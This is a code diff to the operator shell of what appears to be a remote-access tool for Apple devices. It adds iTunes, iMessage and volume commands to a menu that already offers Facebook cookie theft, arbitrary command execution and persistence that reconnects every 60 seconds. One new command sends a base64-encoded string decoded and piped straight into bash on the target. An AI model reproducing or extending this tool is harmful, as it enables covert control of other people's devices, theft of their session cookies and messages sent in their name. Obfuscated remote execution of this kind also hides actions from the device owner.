@@ -38,8 +38,11 @@ class ESShell:
             showCommand("brightness","adjust screen brightness")
             showCommand("getfacebook","attempt to retrieve facebook cookie")
             showCommand("exec","execute command")
-            showCommand("encrypt","encrypt file")
-            showCommand("decrypt","decrypt file")
+            showCommand("play","play iTunes")
+            showCommand("pause","pause iTunes")
+            showCommand("imessage","send messages through messages app")
+            showCommand("setvol","set output volume")
+            showCommand("getvol","view output volume")
             showCommand("persistence","attempts to connect back every 60 seconds")
             showCommand("rmpersistence","removes persistence")
             print ""
@@ -117,8 +120,8 @@ class ESShell:
             #exclusive commands
             if "arm" in session.CDA:
                 if args[0] == "alert":
-                    title = bben(raw_input("Set title: "))
-                    message = bben(raw_input("Set message: "))
+                    title = self.h.bben(raw_input("Set title: "))
+                    message = self.h.bben(raw_input("Set message: "))
                     server.sendCommand(args[0] + " " + title + " " + message,session.conn)
                     continue
                 elif args[0] in iosshortcuts:
@@ -143,6 +146,15 @@ class ESShell:
                     continue
                 elif args[0] == "pause":
                     server.sendCommand("esrunosa tell application \"iTunes\" to pause",session.conn)
+                    continue
+                elif args[0] == "setvol":
+                    if len(args) > 1:
+                        server.sendCommand("esrunosa set volume output volume "+args[1],session.conn)
+                    else:
+                        print "Usage: setvol 0-100"
+                    continue
+                elif args[0] == "getvol":
+                    server.sendCommand("echo b3Nhc2NyaXB0IC1lICJvdXRwdXQgdm9sdW1lIG9mIChnZXQgdm9sdW1lIHNldHRpbmdzKSIK | base64 --decode | bash",session.conn)
                     continue
                 elif args[0] == "imessage":
                     to = raw_input("Send to: ")
